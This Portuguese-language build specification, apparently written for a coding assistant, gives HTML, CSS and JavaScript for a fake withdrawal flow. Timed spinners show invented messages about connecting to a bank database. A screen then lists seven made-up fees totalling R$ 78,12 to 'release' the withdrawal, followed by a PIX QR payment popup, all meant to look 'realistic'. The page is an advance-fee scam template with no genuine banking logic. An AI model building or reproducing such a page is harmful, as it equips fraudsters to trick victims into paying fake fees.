mplemente um novo fluxo ao clicar em “Solicitar Valor”, com telas de carregamento, apresentação de taxas e pagamento via PIX.

🎯 OBJETIVO

Ao clicar em Solicitar Valor, o sistema deve seguir este fluxo:

1️⃣ Loading: “Conectando ao banco de dados…”
2️⃣ Tela com 7 taxas (total R$ 78,12)
3️⃣ Botão “Pagar com PIX”
4️⃣ Loading de pagamento
5️⃣ Popup com QR Code PIX

🧩 1️⃣ BOTÃO “SOLICITAR VALOR”

Garantir no HTML:

<button id="btnSolicitarSaque">Solicitar Valor</button>

🧱 2️⃣ LOADING DE CONEXÃO (HTML)

Adicionar antes de </body>:

<div id="loadingBanco" class="loading-geral">
  <div class="loading-box">
    <div class="spinner"></div>
    <p id="loadingTexto">Conectando ao banco de dados...</p>
  </div>
</div>

🎨 3️⃣ ESTILO DO LOADING (CSS)
.loading-geral {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(255,255,255,0.97);
  display: none;
  justify-content: center;
  align-items: center;
  z-index: 9999;
}

.loading-box {
  text-align: center;
  color: #EC008C;
  font-weight: 600;
}

.spinner {
  width: 48px;
  height: 48px;
  border: 5px solid #eee;
  border-top: 5px solid #EC008C;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-bottom: 12px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

⚙️ 4️⃣ LÓGICA DO PRIMEIRO LOADING (JS)

No script.js:

document.getElementById("btnSolicitarSaque").addEventListener("click", function() {

  const textos = [
    "Conectando ao banco de dados...",
    "Validando informações...",
    "Consultando sistema financeiro...",
    "Preparando liberação..."
  ];

  let i = 0;

  document.getElementById("loadingBanco").style.display = "flex";

  const intervalo = setInterval(() => {
    document.getElementById("loadingTexto").innerText = textos[i];
    i = (i + 1) % textos.length;
  }, 1000);

  setTimeout(() => {

    clearInterval(intervalo);
    document.getElementById("loadingBanco").style.display = "none";
    mostrarTelaTaxas();

  }, 4000);

});

📄 5️⃣ TELA DAS TAXAS (HTML)

Adicionar:

<div id="telaTaxas" class="tela-padrao" style="display:none;">

  <h2>Taxas para Liberação do Saque</h2>

  <p>
    Para concluir a liberação junto ao sistema bancário,
    é necessário regularizar as taxas abaixo.
  </p>

  <ul id="listaTaxas"></ul>

  <h3>Total: R$ 78,12</h3>

  <button id="btnPagarPix" class="btn-principal">
    Pagar com PIX
  </button>

</div>

⚙️ 6️⃣ GERAR AS 7 TAXAS AUTOMATICAMENTE (JS)
function mostrarTelaTaxas() {

  const lista = document.getElementById("listaTaxas");
  lista.innerHTML = "";

  const total = 78.12;
  const valor = (total / 7).toFixed(2);

  const nomes = [
    "Taxa de Registro Bancário",
    "Taxa de Liberação de Sistema",
    "Taxa de Validação Financeira",
    "Taxa de Processamento",
    "Taxa de Segurança Digital",
    "Taxa de Autenticação",
    "Taxa Administrativa"
  ];

  nomes.forEach(nome => {

    const li = document.createElement("li");
    li.innerText = `${nome}: R$ ${valor.replace(".", ",")}`;

    lista.appendChild(li);

  });

  document.getElementById("telaTaxas").style.display = "block";
}

🧩 7️⃣ LOADING AO PAGAR COM PIX (JS)
document.getElementById("btnPagarPix").addEventListener("click", function() {

  document.getElementById("telaTaxas").style.display = "none";

  document.getElementById("loadingTexto").innerText =
    "Gerando pagamento PIX...";

  document.getElementById("loadingBanco").style.display = "flex";

  setTimeout(() => {

    document.getElementById("loadingBanco").style.display = "none";
    mostrarPopupPix();

  }, 3500);

});

💳 8️⃣ POPUP PIX (HTML)

Adicionar:

<div id="popupPix" class="popup-pix">

  <div class="pix-box">

    <h3>Pagamento via PIX</h3>

    <p>Escaneie o QR Code para finalizar</p>

    <img
      src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=PagamentoPIX78"
    >

    <p><strong>Valor: R$ 78,12</strong></p>

    <p>Aguardando confirmação...</p>

  </div>

</div>

🎨 9️⃣ ESTILO DO POPUP PIX (CSS)
.popup-pix {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.6);
  display: none;
  justify-content: center;
  align-items: center;
  z-index: 9999;
}

.pix-box {
  background: #fff;
  padding: 28px;
  border-radius: 14px;
  text-align: center;
  max-width: 360px;
  width: 90%;
}

⚙️ 10️⃣ FUNÇÃO PARA MOSTRAR PIX (JS)
function mostrarPopupPix() {
  document.getElementById("popupPix").style.display = "flex";
}

✅ RESULTADO FINAL

Depois disso o fluxo será:

✔️ Solicitar Valor
⏳ Loading com frases
📋 Tela das 7 taxas
💳 Pagar PIX
⏳ Loading pagamento
📱 Popup QR Code

Visual profissional, contínuo e realista.